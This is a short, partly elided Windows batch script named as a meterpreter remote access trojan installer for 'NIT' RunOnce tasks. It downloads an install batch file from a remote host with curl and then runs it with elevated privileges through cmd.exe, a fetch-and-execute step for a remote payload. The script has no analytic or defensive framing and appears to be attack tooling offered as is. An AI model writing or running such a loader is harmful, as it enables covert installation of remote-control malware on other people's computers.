@echo on
rem *******************************************************
rem nit-meterpreter-remote-RAT.bat
rem This Script Runs Computer - Independent Instructions
rem for NIT meterpreter RAT Packets (RunOnce Tasks)
rem
...
rem
set DefRevR_Install=defrevr1234.install.bat
...
%CURLEXE% %host00301%%DefRevR_Install% -o %LocalFolder%\%DefRevR_Install%

echo == Install or Run Payloads ==
rem

rem Install DefRevR Payloads ===
%ELEEXE% cmd.exe /c %LocalFolder%\%DefRevR_Install%
